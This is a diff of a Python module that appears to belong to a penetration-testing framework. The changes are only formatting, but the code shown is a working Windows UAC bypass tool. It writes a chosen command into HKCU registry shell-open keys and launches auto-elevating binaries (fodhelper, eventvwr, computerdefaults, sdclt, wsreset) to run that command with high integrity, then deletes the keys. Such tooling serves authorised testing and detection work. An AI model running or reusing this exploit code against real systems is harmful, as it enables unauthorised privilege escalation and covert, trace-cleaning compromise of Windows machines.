@@ -9,31 +9,33 @@ ATT&CK Technique: T1548.002 - Bypass User Account Control
 Warning: 仅限授权渗透测试使用！
 """
 
-from dataclasses import dataclass
-from typing import Optional, Dict, Any, List
-from enum import Enum
 import logging
 import platform
+from dataclasses import dataclass
+from enum import Enum
+from typing import Any, Dict, List, Optional
 
-from ..base import EscalationResult, EscalationMethod, PrivilegeLevel
+from ..base import EscalationMethod, EscalationResult, PrivilegeLevel
 
 logger = logging.getLogger(__name__)
 
 
 class UACBypassTechnique(Enum):
     """UAC 绕过技术"""
-    FODHELPER = 'fodhelper'
-    EVENTVWR = 'eventvwr'
-    COMPUTERDEFAULTS = 'computerdefaults'
-    SDCLT = 'sdclt'
-    SILENTCLEANUP = 'silentcleanup'
-    CMSTP = 'cmstp'
-    WSRESET = 'wsreset'
+
+    FODHELPER = "fodhelper"
+    EVENTVWR = "eventvwr"
+    COMPUTERDEFAULTS = "computerdefaults"
+    SDCLT = "sdclt"
+    SILENTCLEANUP = "silentcleanup"
+    CMSTP = "cmstp"
+    WSRESET = "wsreset"
 
 
 @dataclass
 class UACInfo:
     """UAC 配置信息"""
+
     enabled: bool = True
     level: int = 5  # 0-5, 0=disabled
     consent_behavior_admin: int = 5
@@ -42,11 +44,11 @@ class UACInfo:
 
     def to_dict(self) -> Dict[str, Any]:
         return {
-            'enabled': self.enabled,
-            'level': self.level,
-            'consent_behavior_admin': self.consent_behavior_admin,
-            'consent_behavior_user': self.consent_behavior_user,
-            'prompt_on_secure_desktop': self.prompt_on_secure_desktop,
+            "enabled": self.enabled,
+            "level": self.level,
+            "consent_behavior_admin": self.consent_behavior_admin,
+            "consent_behavior_user": self.consent_behavior_user,
+            "prompt_on_secure_desktop": self.prompt_on_secure_desktop,
         }
 
 
@@ -81,27 +83,35 @@ class UACBypass:
 
             # 检查 EnableLUA
             result = subprocess.run(
-                ['reg', 'query',
-                 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-                 '/v', 'EnableLUA'],
+                [
+                    "reg",
+                    "query",
+                    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+                    "/v",
+                    "EnableLUA",
+                ],
                 capture_output=True,
                 text=True,
-                timeout=10
+                timeout=10,
             )
-            if '0x0' in result.stdout:
+            if "0x0" in result.stdout:
                 info.enabled = False
 
             # 检查 ConsentPromptBehaviorAdmin
             result = subprocess.run(
-                ['reg', 'query',
-                 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
-                 '/v', 'ConsentPromptBehaviorAdmin'],
+                [
+                    "reg",
+                    "query",
+                    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+                    "/v",
+                    "ConsentPromptBehaviorAdmin",
+                ],
                 capture_output=True,
                 text=True,
-                timeout=10
+                timeout=10,
             )
-            for line in result.stdout.split('\n'):
-                if 'ConsentPromptBehaviorAdmin' in line:
+            for line in result.stdout.split("\n"):
+                if "ConsentPromptBehaviorAdmin" in line:
                     parts = line.split()
                     if parts:
                         try:
@@ -120,6 +130,7 @@ class UACBypass:
         """检查当前进程是否已提升"""
         try:
             import ctypes
+
             return ctypes.windll.shell32.IsUserAnAdmin() != 0
         except (AttributeError, OSError, ValueError):
             return False
@@ -132,14 +143,15 @@ class UACBypass:
 
         # 检查各种绕过工具是否存在
         technique_binaries = {
-            UACBypassTechnique.FODHELPER: 'C:\\Windows\\System32\\fodhelper.exe',
-            UACBypassTechnique.EVENTVWR: 'C:\\Windows\\System32\\eventvwr.exe',
-            UACBypassTechnique.COMPUTERDEFAULTS: 'C:\\Windows\\System32\\computerdefaults.exe',
-            UACBypassTechnique.SDCLT: 'C:\\Windows\\System32\\sdclt.exe',
-            UACBypassTechnique.WSRESET: 'C:\\Windows\\System32\\wsreset.exe',
+            UACBypassTechnique.FODHELPER: "C:\\Windows\\System32\\fodhelper.exe",
+            UACBypassTechnique.EVENTVWR: "C:\\Windows\\System32\\eventvwr.exe",
+            UACBypassTechnique.COMPUTERDEFAULTS: "C:\\Windows\\System32\\computerdefaults.exe",
+            UACBypassTechnique.SDCLT: "C:\\Windows\\System32\\sdclt.exe",
+            UACBypassTechnique.WSRESET: "C:\\Windows\\System32\\wsreset.exe",
         }
 
         from pathlib import Path
+
         for technique, binary_path in technique_binaries.items():
             if Path(binary_path).exists():
                 available.append(technique)
@@ -147,9 +159,7 @@ class UACBypass:
         return available
 
     def execute(
-        self,
-        technique: Optional[UACBypassTechnique] = None,
-        command: str = 'cmd.exe'
+        self, technique: Optional[UACBypassTechnique] = None, command: str = "cmd.exe"
     ) -> EscalationResult:
         """
         执行 UAC 绕过
@@ -162,13 +172,13 @@ class UACBypass:
             EscalationResult
         """
         # 平台检测
-        if platform.system() != 'Windows':
+        if platform.system() != "Windows":
             return EscalationResult(
                 success=False,
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=PrivilegeLevel.MEDIUM,
                 to_level=PrivilegeLevel.MEDIUM,
-                error="UAC Bypass is only supported on Windows"
+                error="UAC Bypass is only supported on Windows",
             )
 
         from_level = PrivilegeLevel.MEDIUM
@@ -180,7 +190,7 @@ class UACBypass:
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=PrivilegeLevel.HIGH,
                 to_level=PrivilegeLevel.HIGH,
-                output="Already elevated"
+                output="Already elevated",
             )
 
         # 检查 UAC 是否禁用
@@ -191,7 +201,7 @@ class UACBypass:
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=from_level,
                 to_level=PrivilegeLevel.HIGH,
-                output="UAC is disabled"
+                output="UAC is disabled",
             )
 
         # 自动选择技术
@@ -203,7 +213,7 @@ class UACBypass:
                     method=EscalationMethod.UAC_BYPASS,
                     from_level=from_level,
                     to_level=from_level,
-                    error="No available UAC bypass technique"
+                    error="No available UAC bypass technique",
                 )
             technique = available[0]
 
@@ -225,7 +235,7 @@ class UACBypass:
                     method=EscalationMethod.UAC_BYPASS,
                     from_level=from_level,
                     to_level=from_level,
-                    error=f"Unsupported technique: {technique.value}"
+                    error=f"Unsupported technique: {technique.value}",
                 )
         except Exception as e:
             return EscalationResult(
@@ -233,7 +243,7 @@ class UACBypass:
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=from_level,
                 to_level=from_level,
-                error=str(e)
+                error=str(e),
             )
 
     def _fodhelper_bypass(self, command: str) -> EscalationResult:
@@ -247,35 +257,31 @@ class UACBypass:
         import subprocess
         import time
 
-        reg_path = 'HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command'
+        reg_path = "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
 
         try:
             # 创建注册表键
-            subprocess.run(
-                ['reg', 'add', reg_path, '/f'],
-                capture_output=True,
-                timeout=10
-            )
+            subprocess.run(["reg", "add", reg_path, "/f"], capture_output=True, timeout=10)
 
             # 设置默认值为要执行的命令
             subprocess.run(
-                ['reg', 'add', reg_path, '/ve', '/t', 'REG_SZ', '/d', command, '/f'],
+                ["reg", "add", reg_path, "/ve", "/t", "REG_SZ", "/d", command, "/f"],
                 capture_output=True,
-                timeout=10
+                timeout=10,
             )
 
             # 添加 DelegateExecute 空值
             subprocess.run(
-                ['reg', 'add', reg_path, '/v', 'DelegateExecute', '/t', 'REG_SZ', '/d', '', '/f'],
+                ["reg", "add", reg_path, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"],
                 capture_output=True,
-                timeout=10
+                timeout=10,
             )
 
             # 执行 fodhelper.exe
             subprocess.Popen(
-                ['C:\\Windows\\System32\\fodhelper.exe'],
+                ["C:\\Windows\\System32\\fodhelper.exe"],
                 stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
+                stderr=subprocess.DEVNULL,
             )
 
             # 等待执行
@@ -283,9 +289,9 @@ class UACBypass:
 
             # 清理注册表
             subprocess.run(
-                ['reg', 'delete', 'HKCU\\Software\\Classes\\ms-settings', '/f'],
+                ["reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f"],
                 capture_output=True,
-                timeout=10
+                timeout=10,
             )
 
             return EscalationResult(
@@ -294,16 +300,16 @@ class UACBypass:
                 from_level=PrivilegeLevel.MEDIUM,
                 to_level=PrivilegeLevel.HIGH,
                 output=f"fodhelper bypass executed: {command}",
-                cleanup_command='reg delete HKCU\\Software\\Classes\\ms-settings /f'
+                cleanup_command="reg delete HKCU\\Software\\Classes\\ms-settings /f",
             )
 
         except Exception as e:
             # 尝试清理
             try:
                 subprocess.run(
-                    ['reg', 'delete', 'HKCU\\Software\\Classes\\ms-settings', '/f'],
+                    ["reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f"],
                     capture_output=True,
-                    timeout=10
+                    timeout=10,
                 )
             except Exception as exc:
                 logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)
@@ -313,7 +319,7 @@ class UACBypass:
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=PrivilegeLevel.MEDIUM,
                 to_level=PrivilegeLevel.MEDIUM,
-                error=f"fodhelper bypass failed: {e}"
+                error=f"fodhelper bypass failed: {e}",
             )
 
     def _eventvwr_bypass(self, command: str) -> EscalationResult:
@@ -325,37 +331,33 @@ class UACBypass:
         import subprocess
         import time
 
-        reg_path = 'HKCU\\Software\\Classes\\mscfile\\shell\\open\\command'
+        reg_path = "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command"
 
         try:
             # 创建注册表键
-            subprocess.run(
-                ['reg', 'add', reg_path, '/f'],
-                capture_output=True,
-                timeout=10
-            )
+            subprocess.run(["reg", "add", reg_path, "/f"], capture_output=True, timeout=10)
 
             # 设置默认值
             subprocess.run(
-                ['reg', 'add', reg_path, '/ve', '/t', 'REG_SZ', '/d', command, '/f'],
+                ["reg", "add", reg_path, "/ve", "/t", "REG_SZ", "/d", command, "/f"],
                 capture_output=True,
-                timeout=10
+                timeout=10,
             )
 
             # 执行 eventvwr.exe
             subprocess.Popen(
-                ['C:\\Windows\\System32\\eventvwr.exe'],
+                ["C:\\Windows\\System32\\eventvwr.exe"],
                 stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
+                stderr=subprocess.DEVNULL,
             )
 
             time.sleep(2)
 
             # 清理
             subprocess.run(
-                ['reg', 'delete', 'HKCU\\Software\\Classes\\mscfile', '/f'],
+                ["reg", "delete", "HKCU\\Software\\Classes\\mscfile", "/f"],
                 capture_output=True,
-                timeout=10
+                timeout=10,
             )
 
             return EscalationResult(
@@ -364,15 +366,15 @@ class UACBypass:
                 from_level=PrivilegeLevel.MEDIUM,
                 to_level=PrivilegeLevel.HIGH,
                 output=f"eventvwr bypass executed: {command}",
-                cleanup_command='reg delete HKCU\\Software\\Classes\\mscfile /f'
+                cleanup_command="reg delete HKCU\\Software\\Classes\\mscfile /f",
             )
 
         except Exception as e:
             try:
                 subprocess.run(
-                    ['reg', 'delete', 'HKCU\\Software\\Classes\\mscfile', '/f'],
+                    ["reg", "delete", "HKCU\\Software\\Classes\\mscfile", "/f"],
                     capture_output=True,
-                    timeout=10
+                    timeout=10,
                 )
             except Exception as exc:
                 logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)
@@ -382,7 +384,7 @@ class UACBypass:
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=PrivilegeLevel.MEDIUM,
                 to_level=PrivilegeLevel.MEDIUM,
-                error=f"eventvwr bypass failed: {e}"
+                error=f"eventvwr bypass failed: {e}",
             )
 
     def _computerdefaults_bypass(self, command: str) -> EscalationResult:
@@ -390,30 +392,33 @@ class UACBypass:
         import subprocess
         import time
 
-        reg_path = 'HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command'
+        reg_path = "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
 
         try:
-            subprocess.run(['reg', 'add', reg_path, '/f'], capture_output=True, timeout=10)
+            subprocess.run(["reg", "add", reg_path, "/f"], capture_output=True, timeout=10)
             subprocess.run(
-                ['reg', 'add', reg_path, '/ve', '/t', 'REG_SZ', '/d', command, '/f'],
-                capture_output=True, timeout=10
+                ["reg", "add", reg_path, "/ve", "/t", "REG_SZ", "/d", command, "/f"],
+                capture_output=True,
+                timeout=10,
             )
             subprocess.run(
-                ['reg', 'add', reg_path, '/v', 'DelegateExecute', '/t', 'REG_SZ', '/d', '', '/f'],
-                capture_output=True, timeout=10
+                ["reg", "add", reg_path, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"],
+                capture_output=True,
+                timeout=10,
             )
 
             subprocess.Popen(
-                ['C:\\Windows\\System32\\computerdefaults.exe'],
+                ["C:\\Windows\\System32\\computerdefaults.exe"],
                 stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
+                stderr=subprocess.DEVNULL,
             )
 
             time.sleep(2)
 
             subprocess.run(
-                ['reg', 'delete', 'HKCU\\Software\\Classes\\ms-settings', '/f'],
-                capture_output=True, timeout=10
+                ["reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f"],
+                capture_output=True,
+                timeout=10,
             )
 
             return EscalationResult(
@@ -421,7 +426,7 @@ class UACBypass:
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=PrivilegeLevel.MEDIUM,
                 to_level=PrivilegeLevel.HIGH,
-                output=f"computerdefaults bypass executed: {command}"
+                output=f"computerdefaults bypass executed: {command}",
             )
 
         except Exception as e:
@@ -430,7 +435,7 @@ class UACBypass:
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=PrivilegeLevel.MEDIUM,
                 to_level=PrivilegeLevel.MEDIUM,
-                error=str(e)
+                error=str(e),
             )
 
     def _sdclt_bypass(self, command: str) -> EscalationResult:
@@ -438,30 +443,33 @@ class UACBypass:
         import subprocess
         import time
 
-        reg_path = 'HKCU\\Software\\Classes\\Folder\\shell\\open\\command'
+        reg_path = "HKCU\\Software\\Classes\\Folder\\shell\\open\\command"
 
         try:
-            subprocess.run(['reg', 'add', reg_path, '/f'], capture_output=True, timeout=10)
+            subprocess.run(["reg", "add", reg_path, "/f"], capture_output=True, timeout=10)
             subprocess.run(
-                ['reg', 'add', reg_path, '/ve', '/t', 'REG_SZ', '/d', command, '/f'],
-                capture_output=True, timeout=10
+                ["reg", "add", reg_path, "/ve", "/t", "REG_SZ", "/d", command, "/f"],
+                capture_output=True,
+                timeout=10,
             )
             subprocess.run(
-                ['reg', 'add', reg_path, '/v', 'DelegateExecute', '/t', 'REG_SZ', '/d', '', '/f'],
-                capture_output=True, timeout=10
+                ["reg", "add", reg_path, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"],
+                capture_output=True,
+                timeout=10,
             )
 
             subprocess.Popen(
-                ['C:\\Windows\\System32\\sdclt.exe'],
+                ["C:\\Windows\\System32\\sdclt.exe"],
                 stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
+                stderr=subprocess.DEVNULL,
             )
 
             time.sleep(3)
 
             subprocess.run(
-                ['reg', 'delete', 'HKCU\\Software\\Classes\\Folder', '/f'],
-                capture_output=True, timeout=10
+                ["reg", "delete", "HKCU\\Software\\Classes\\Folder", "/f"],
+                capture_output=True,
+                timeout=10,
             )
 
             return EscalationResult(
@@ -469,7 +477,7 @@ class UACBypass:
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=PrivilegeLevel.MEDIUM,
                 to_level=PrivilegeLevel.HIGH,
-                output=f"sdclt bypass executed: {command}"
+                output=f"sdclt bypass executed: {command}",
             )
 
         except Exception as e:
@@ -478,7 +486,7 @@ class UACBypass:
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=PrivilegeLevel.MEDIUM,
                 to_level=PrivilegeLevel.MEDIUM,
-                error=str(e)
+                error=str(e),
             )
 
     def _wsreset_bypass(self, command: str) -> EscalationResult:
@@ -486,30 +494,40 @@ class UACBypass:
         import subprocess
         import time
 
-        reg_path = 'HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635ber5d0r5xdl3e8\\Shell\\open\\command'
+        reg_path = (
+            "HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635ber5d0r5xdl3e8\\Shell\\open\\command"
+        )
 
         try:
-            subprocess.run(['reg', 'add', reg_path, '/f'], capture_output=True, timeout=10)
+            subprocess.run(["reg", "add", reg_path, "/f"], capture_output=True, timeout=10)
             subprocess.run(
-                ['reg', 'add', reg_path, '/ve', '/t', 'REG_SZ', '/d', command, '/f'],
-                capture_output=True, timeout=10
+                ["reg", "add", reg_path, "/ve", "/t", "REG_SZ", "/d", command, "/f"],
+                capture_output=True,
+                timeout=10,
             )
             subprocess.run(
-                ['reg', 'add', reg_path, '/v', 'DelegateExecute', '/t', 'REG_SZ', '/d', '', '/f'],
-                capture_output=True, timeout=10
+                ["reg", "add", reg_path, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"],
+                capture_output=True,
+                timeout=10,
             )
 
             subprocess.Popen(
-                ['C:\\Windows\\System32\\wsreset.exe'],
+                ["C:\\Windows\\System32\\wsreset.exe"],
                 stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
+                stderr=subprocess.DEVNULL,
             )
 
             time.sleep(3)
 
             subprocess.run(
-                ['reg', 'delete', 'HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635ber5d0r5xdl3e8', '/f'],
-                capture_output=True, timeout=10
+                [
+                    "reg",
+                    "delete",
+                    "HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635ber5d0r5xdl3e8",
+                    "/f",
+                ],
+                capture_output=True,
+                timeout=10,
             )
 
             return EscalationResult(
@@ -517,7 +535,7 @@ class UACBypass:
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=PrivilegeLevel.MEDIUM,
                 to_level=PrivilegeLevel.HIGH,
-                output=f"wsreset bypass executed: {command}"
+                output=f"wsreset bypass executed: {command}",
             )
 
         except Exception as e:
@@ -526,8 +544,8 @@ class UACBypass:
                 method=EscalationMethod.UAC_BYPASS,
                 from_level=PrivilegeLevel.MEDIUM,
                 to_level=PrivilegeLevel.MEDIUM,
-                error=str(e)
+                error=str(e),
             )
 
 
-__all__ = ['UACBypass', 'UACBypassTechnique', 'UACInfo']
+__all__ = ["UACBypass", "UACBypassTechnique", "UACInfo"]
